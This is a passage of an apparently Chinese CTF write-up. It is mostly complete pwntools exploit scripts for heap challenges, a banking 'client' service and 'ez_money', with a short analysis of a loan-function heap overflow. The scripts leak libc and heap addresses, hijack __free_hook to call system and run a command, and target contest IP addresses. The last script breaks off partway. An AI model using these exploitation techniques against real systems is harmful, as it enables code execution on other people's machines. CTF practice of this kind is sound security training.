<p>完整 exp：（不通过 <code>client</code> 进行交互）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg_send</span>(<span class="params">op, account_id=<span class="string">&quot;&quot;</span>, password=<span class="string">&quot;&quot;</span>, money=<span class="number">0</span></span>):</span></span><br><span class="line">    data = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: op,</span><br><span class="line">            <span class="number">0x10</span>: password,</span><br><span class="line">            <span class="number">0x18</span>: account_id,</span><br><span class="line">            <span class="number">0x38</span>: p32(money),</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    ).ljust(<span class="number">0x98</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line">    clibc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getrand</span>():</span></span><br><span class="line">        <span class="keyword">return</span> clibc.rand() % <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    ask_time = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">    clibc.srand(ask_time)</span><br><span class="line">    uuid = <span class="built_in">list</span>(<span class="string">&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(uuid)):</span><br><span class="line">        <span class="keyword">if</span> uuid[i] != <span class="string">&#x27;4&#x27;</span> <span class="keyword">and</span> uuid[i] != <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> uuid[i] == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                uuid[i] = <span class="built_in">hex</span>(getrand())[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                uuid[i] = <span class="built_in">hex</span>(getrand() &amp; <span class="number">3</span> | <span class="number">8</span>)[<span class="number">2</span>:]</span><br><span class="line">    uuid = <span class="string">&#x27;&#x27;</span>.join(uuid)</span><br><span class="line">    sh.send(uuid)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;139.9.242.36&#x27;, 4445)</span></span><br><span class="line">init()</span><br><span class="line">msg_send(<span class="string">&quot;stat_query&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x21c87</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook_addr = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x4f420</span></span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;account1&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">msg_send(<span class="string">&quot;cancellation&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;account1&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">sh.recvuntil(p64(<span class="number">0x41</span>) + p64(<span class="number">0</span>))</span><br><span class="line">heap_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:\t&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg_send(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;cancellation&quot;</span>, <span class="string">&quot;account2&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;account1&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;cancellation&quot;</span>, <span class="string">&quot;account1&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg_send(<span class="string">&quot;login&quot;</span>, p64(heap_base + <span class="number">0x10</span>), p64(heap_base + <span class="number">0x6b0</span>))</span><br><span class="line">msg_send(<span class="string">&quot;update_pwd&quot;</span>, <span class="string">&quot;account1&quot;</span>, p64(free_hook_addr - <span class="number">0x18</span>))</span><br><span class="line">msg_send(<span class="string">&quot;update_pwd&quot;</span>, <span class="string">&quot;account1&quot;</span>, p64(heap_base + <span class="number">0x6b0</span>))</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line">msg_send(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line">msg_send(<span class="string">&quot;new_account&quot;</span>, <span class="string">&quot;&gt;&amp;4\x00&quot;</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(system_addr), <span class="string">&quot;cat flag&quot;</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line">msg_send(<span class="string">&quot;cancellation&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>完整 exp：（直接修改 <code>client</code>）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./client&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(challenge)</span></span><br><span class="line">    p = process([<span class="string">&#x27;./client&#x27;</span>,<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;3339&#x27;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&#x27;./client&#x27;</span>,<span class="string">&#x27;139.9.242.36&#x27;</span>,<span class="string">&#x27;4445&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x19DA)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;your choice :&quot;</span>,choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,passwd,money</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;new_account&quot;</span>) </span><br><span class="line">    sla(<span class="string">&quot;please input the account id&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line">    sla(<span class="string">&quot;please input the password&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;please input the money&quot;</span>,<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">passwd</span>):</span>            </span><br><span class="line">    cmd(<span class="string">&quot;cancellation&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please enter the password&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;exit_account&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;query&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;login&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please input the account id&quot;</span>,account)</span><br><span class="line">    sla(<span class="string">&quot;please input the password&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">account,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;transfer_account&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please enter the remittance amount&quot;</span>,account)</span><br><span class="line">    sla(<span class="string">&quot;please input your pasword&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">passwd,old_passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;update_pwd&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;please entet  a new password&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;please input your pasword.&quot;</span>,old_passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stat_query</span>():</span></span><br><span class="line">    cmd(<span class="string">&#x27;stat_query&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stat_query()</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21c87</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">8</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">0x61</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    login(<span class="built_in">str</span>(i)*<span class="number">8</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">    free(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;7&quot;</span>*<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">edit(p64(free_hook-<span class="number">0x10</span>),<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i)*<span class="number">6</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">0x61</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,p64(system_libc),<span class="number">0x61</span>)</span><br><span class="line">quit()</span><br><span class="line">add(<span class="string">&#x27;&gt;&amp;4 &#x27;</span>,<span class="string">&#x27;cat flag&#x27;</span>,<span class="number">120</span>)</span><br><span class="line">free(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>非预期</p>
<h2 id="ez-money"><a href="#ez-money" class="headerlink" title="ez_money"></a>ez_money</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ez_money: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=d3173989de9ecef646bad08f24a9d5fda1061937, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped    </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>在 <code>loan</code> 函数中有溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( loan_index &gt; <span class="number">10</span> )</span><br><span class="line">&#123;</span><br><span class="line">  output(<span class="string">&quot;The loan has reached the upper limit of the system.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>loan</code> 函数的执行次数没有设置正确，导致程序有一个堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序会先申请一个 chunk 来存放 <code>loan_info</code>，它的相邻下一个 chunk 就是 chunk_list 的第一个对象</p>
<ul>
<li>我们在存放 <code>loan_info</code> 的 chunk 中进行溢出，修改相邻下一个 chunk 的 size 大小，使其可以进入 largebin</li>
<li>然后释放掉 chunk_list 的第一个对象，使其进入 largebin，然后打印 <code>loan_info</code> 就可以泄露 libc_base</li>
</ul>
<p>由于 libc-2.31 有 key 值保护 tcachebin，因此我们需要用同样的方式来泄露 heap_base</p>
<ul>
<li>在之前生成的 unsortedbin 中申请新的 chunk，使其覆盖原来 chunk_list 的第一个对象</li>
<li>将其释放并组织一下堆风水就可以泄露 heap_base</li>
</ul>
<p>最后利用堆风水劫持 tcachebin 就好了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./ez_money&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1888)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;your choice&quot;</span>,op)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,passwd,money</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;new_account&quot;</span>) </span><br><span class="line">    sla(<span class="string">&quot;please input the account id&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line">    sla(<span class="string">&quot;please input the 